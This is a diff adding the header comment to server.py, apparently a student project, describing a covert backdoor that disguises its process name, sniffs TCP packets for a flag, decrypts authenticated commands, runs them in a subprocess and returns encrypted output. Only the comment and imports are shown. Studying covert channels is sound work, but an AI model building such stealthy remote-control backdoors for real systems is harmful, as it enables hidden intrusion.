@@ -1,3 +1,31 @@
+######################################################################
+#   Created by: Elton Sia A00800541
+#   
+#   File: server.py
+#
+#   Description:
+#   Once the server.py is running, it changes its process name to 
+#   something else and then goes straight into sniffing mode and waits
+#   for TCP packets with the destination port as the server port. Once 
+#   it gets a match, we check if the flag on that packet is set to "C".
+#   If it is, we then check if it is indeed the correct destination port.
+#   We then decrypt the data and check for the authentication string. If
+#   it has the authentication string, we then delete the authentication
+#   string and check again if the command sent was a regular command or
+#   an exit command. If the command was an exit command, we send back to
+#   the client an exit commant, otherwise we run the command in a sub 
+#   process and store the output into a variable. We then encrypt both
+#   the authentication string with the output and send it back to the 
+#   client. We go back to sniffing mode once we have sent it over to the
+#   client.
+#
+#   Functions:
+#   usage()
+#   encryptCommand()
+#   decryptCommand()
+#   server()
+######################################################################
+
 import sys
 import subprocess
 import setproctitle
